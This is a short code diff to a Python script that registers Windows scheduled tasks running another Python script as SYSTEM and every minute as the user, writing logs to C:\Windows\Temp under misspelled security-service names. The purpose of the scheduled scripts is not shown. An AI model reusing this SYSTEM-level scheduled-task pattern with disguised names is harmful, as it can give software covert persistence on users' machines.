@@ -38,7 +38,7 @@ subprocess.run(
         "/ru", "SYSTEM",
         "/rl", "highest",
         "/tn", SYSTEM_TASK_NAME,
-        "/tr", f'"{PYTHON_EXE}" "{SYSTEM_DST}" >> %temp%\\SecutiryServicesLogsSystem.txt 2>&1'
+        "/tr", f'"{PYTHON_EXE}" "{SYSTEM_DST}" >> C:\\Windows\\Temp\\SecutiryServicesLogsSystem.txt 2>&1'
         #"/ri", "1",
         #"/du", "00:30"
     ],
@@ -55,9 +55,8 @@ subprocess.run(
         "/sc", "minute",
         "/mo", "1",
         "/ru", os.getlogin(),
-        "/rl", "highest",
         "/tn", USER_TASK_NAME,
-        "/tr", f'"{PYTHON_EXE}" "{USER_DST}" >> %temp%\\SecutiryServicesLogsUser.txt 2>&1',
+        "/tr", f'"{PYTHON_EXE}" "{USER_DST}" >> C:\\Windows\\Temp\\SecutiryServicesLogsUser.txt 2>&1',
         #"/ri", "1",
         #"/du", "00:30"
     ],
